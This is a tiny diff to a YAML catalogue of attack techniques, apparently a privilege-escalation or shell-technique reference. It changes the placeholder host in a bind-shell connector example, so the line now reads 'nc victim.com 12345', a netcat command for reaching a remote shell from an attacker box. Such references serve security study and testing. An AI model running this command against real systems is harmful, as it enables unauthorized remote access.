@@ -48,7 +48,7 @@ bind-shell:
     connector:
       tcp-client:
         comment: A TCP client can be used on the attacker box to connect to the shell.
-        code: nc target.com 12345
+        code: nc victim.com 12345
 
 file-write:
   label: File write
